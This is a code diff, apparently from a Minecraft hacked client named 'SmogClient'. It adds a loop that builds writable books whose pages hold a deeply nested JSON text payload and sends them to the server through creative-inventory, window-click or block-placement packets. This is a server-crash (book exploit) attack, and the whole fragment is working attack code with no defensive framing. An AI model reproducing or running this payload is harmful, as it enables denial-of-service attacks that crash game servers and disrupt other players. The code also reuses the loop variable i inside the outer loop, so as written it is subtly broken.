@@ -1,0 +1,26 @@
+for (int i = 0; i < packets; ++i) {
+	NBTTagCompound tag = new NBTTagCompound();
+	NBTTagList list = new NBTTagList();
+	String value ="{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}],text:L}";
+	for (int i = 0; i < pages; ++i) {
+		list.appendTag(new NBTTagString(value));
+	}
+	tag.setString("author", "SmogClient");
+	tag.setString("title", "BOOK");
+	tag.setByte("resolved", (byte) 1);
+	tag.setTag("pages", list);
+	ItemStack book = new ItemStack(Items.writable_book);
+	book.setTagCompound(tag);
+	buffer.writeItemStack(book);
+	switch(packet_type){
+		case "cinv":
+			Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(-1, book));
+			break;
+		case "wclick":
+			Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 1, 0, 1, book, (short) 0));
+			break;
+		case "bplace":
+			Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX,Minecraft.getMinecraft().thePlayer.posY - 0.0D, Minecraft.getMinecraft().thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
+			break;
+	}
+}
